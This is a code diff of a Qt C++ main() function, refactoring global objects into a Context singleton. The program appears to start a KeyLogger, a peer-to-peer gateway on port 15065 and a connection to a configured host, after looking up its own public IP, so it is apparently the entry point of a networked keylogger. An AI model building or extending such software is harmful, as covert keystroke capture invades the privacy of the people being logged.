@@ -11,11 +11,12 @@
 #include "web/HttpResponse.h"
 
 #include "core/CommandProvider.h"
+#include "core/Context.h"
 
 int main(int argc, char *argv[])
 {
     QCoreApplication a(argc, argv);
-
+    
     HttpResponse resp(HttpManager::getPage(QUrl("http://api.sypexgeo.net/")));
     QJsonParseError err;
     QJsonDocument json = QJsonDocument::fromJson(resp.body().toUtf8(), &err);
@@ -23,25 +24,26 @@ int main(int argc, char *argv[])
     {
         qDebug() <<"Json parsing error" << err.errorString() <<  "near" << resp.body().mid(err.offset, 5);
     }
-    ip = json.object()["ip"].toString();
-    qDebug() << "My ip:" << ip;
+    Context::instance().setIp(json.object()["ip"].toString());
+    qDebug() << "My ip:" << Context::instance().getIp();
 
     QDir dir(a.applicationDirPath());
     QSettings settings(dir.absoluteFilePath("p2p.conf"), QSettings::IniFormat);
 
-    keyLogger = new KeyLogger(&a);
-    pipeController = new PipeController(new Gateway(15065, &a), &a);
-    messageController = new MessageController(keyLogger, pipeController, &a);
+    
+    Context::instance().keyLogger = new KeyLogger(&a);
+    Context::instance().pipeController = new PipeController(new Gateway(15065, &a), &a);
+    Context::instance().messageController = new MessageController(&a);
 
     CommandProvider::instance();
 
-    pipeController->addPipe(new Pipe(settings.value("net/connect", "127.0.0.1").toString()));
+    Context::instance().pipeController->addPipe(new Pipe(settings.value("net/connect", "127.0.0.1").toString()));
 
     int ret = a.exec();
 
-    messageController->terminate();
-    pipeController->terminate();
-    keyLogger->terminate();
+    Context::instance().messageController->terminate();
+    Context::instance().pipeController->terminate();
+    Context::instance().keyLogger->terminate();
 
     return ret;
 }
